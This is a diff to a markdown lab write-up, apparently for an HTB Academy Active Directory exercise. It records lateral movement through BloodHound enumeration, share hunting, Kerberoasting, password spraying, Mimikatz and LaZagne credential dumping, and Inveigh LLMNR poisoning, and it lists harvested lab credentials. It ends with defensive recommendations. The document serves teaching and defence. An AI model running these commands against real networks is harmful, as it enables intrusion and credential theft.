@@ -1,4 +1,4 @@
-# Lateral Movement
+# 🔄 Lateral Movement
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 🩸 BloodHound AD Enumeration
 
 ### 🔍 Data Collection
+
 ```bash
 # SharpHound execution (from SYSTEM shell on DEV01)
 SharpHound.exe -c All
@@ -21,6 +22,7 @@ Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP
 ```
 
 ### 🎯 Attack Path Analysis
+
 ```cmd
 # hporter account analysis:
 - ForceChangePassword rights over ssmalls user
@@ -39,6 +41,7 @@ Risk: Medium (Excessive Active Directory Group Privileges)
 ## 📁 File Share Hunting
 
 ### 🔍 Share Discovery & Enumeration
+
 ```bash
 # Initial share enumeration (hporter)
 Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
@@ -53,6 +56,7 @@ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_pl
 ```
 
 ### 💾 Credential Discovery in Shares
+
 ```bash
 # Department Shares analysis:
 /IT/Private/Development/SQL Express Backup.ps1
@@ -74,6 +78,7 @@ Const cdoPassword = "L337^p@$$w0rD"
 ## 🎫 Kerberoasting Attack
 
 ### 🔍 SPN Account Discovery
+
 ```powershell
 # PowerView SPN enumeration
 Import-Module .\PowerView.ps1
@@ -87,6 +92,7 @@ Get-DomainUser * -SPN -verbose | Get-DomainSPNTicket -Format Hashcat | Export-Cs
 ```
 
 ### 🔐 Hash Cracking Results
+
 ```bash
 # Hashcat attack
 hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
@@ -103,6 +109,7 @@ backupjob:[CRACKED_PASSWORD]
 ## 🌊 Password Spraying Campaign
 
 ### 💥 Domain-Wide Password Attack
+
 ```powershell
 # DomainPasswordSpray execution
 Invoke-DomainPasswordSpray -Password Welcome1
@@ -119,6 +126,7 @@ Invoke-DomainPasswordSpray -Password Welcome1
 ```
 
 ### 🔍 Additional Enumeration Techniques
+
 ```bash
 # GPP autologin search
 proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
@@ -133,6 +141,7 @@ Get-DomainUser * | select samaccountname,description | ?{$_.Description -ne $nul
 ## 🖥️ MS01 Host Compromise
 
 ### 🔑 WinRM Access Discovery
+
 ```bash
 # WinRM port enumeration
 proxychains nmap -sT -p 5985 172.16.8.50
@@ -144,6 +153,7 @@ proxychains evil-winrm -i 172.16.8.50 -u backupadm
 ```
 
 ### 🔺 Local Privilege Escalation
+
 ```bash
 # Standard privilege checks
 whoami /priv
@@ -161,6 +171,7 @@ net user ilfserveradm
 ```
 
 ### 🛠️ Sysax Automation Privilege Escalation
+
 ```cmd
 # Vulnerable software discovery:
 C:\Program Files (x86)\SysaxAutomation\
@@ -178,6 +189,7 @@ C:\Program Files (x86)\SysaxAutomation\
 ```
 
 ### 💎 Post-Exploitation Credential Harvesting
+
 ```bash
 # Mimikatz execution (as local admin)
 mimikatz.exe
@@ -200,6 +212,7 @@ mssqladm:DBAilfreight1!
 ## 🕷️ Network Credential Harvesting
 
 ### 🎣 Inveigh LLMNR/NBT-NS Poisoning
+
 ```powershell
 # Inveigh execution (as local admin)
 Import-Module .\Inveigh.ps1
@@ -218,6 +231,7 @@ Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
 ```
 
 ### 📊 Additional Intelligence Gathering
+
 ```bash
 # Interesting files discovered:
 c:\budget_data.xlsx          # Potential sensitive data
@@ -236,6 +250,7 @@ lazagne.exe browsers -firefox
 ## 🎯 Credential Summary
 
 ### 🔐 Compromised Accounts Inventory
+
 ```cmd
 # Domain accounts:
 hporter:Gr8hambino!           # Initial domain foothold
@@ -256,6 +271,7 @@ backupjob:[PASSWORD]           # Kerberoasting result
 ```
 
 ### 🎯 Access Matrix
+
 ```cmd
 # Host access capabilities:
 DEV01 (172.16.8.20):
@@ -277,6 +293,7 @@ DMZ01 (172.16.8.120):
 ## 🔍 Attack Path Progression
 
 ### 📊 Lateral Movement Chain
+
 ```cmd
 # Phase 1: Initial domain access
 hporter:Gr8hambino! → Domain Users privileges
@@ -295,6 +312,7 @@ Unattend.xml → AutoLogon → mssqladm discovery
 ```
 
 ### 🎯 Next Phase Preparation
+
 ```cmd
 # Available attack vectors:
 1. mssqladm account exploitation (SQL Server access)
@@ -313,6 +331,7 @@ Unattend.xml → AutoLogon → mssqladm discovery
 ## 🎯 HTB Academy Lab Context
 
 ### 📋 Techniques Demonstrated
+
 ```cmd
 # Active Directory enumeration:
 - BloodHound data collection and analysis
@@ -334,6 +353,7 @@ Unattend.xml → AutoLogon → mssqladm discovery
 ```
 
 ### 🔍 Professional Methodology
+
 ```cmd
 # Systematic approach:
 - Complete domain enumeration before moving
@@ -351,6 +371,7 @@ Unattend.xml → AutoLogon → mssqladm discovery
 ## 🛡️ Defensive Recommendations
 
 ### 🔒 Active Directory Security
+
 ```cmd
 # Account management:
 - Implement least privilege principles
@@ -369,4 +390,4 @@ Unattend.xml → AutoLogon → mssqladm discovery
 - Implement network segmentation
 - Monitor for lateral movement patterns
 - Deploy endpoint detection and response
-``` 
+```
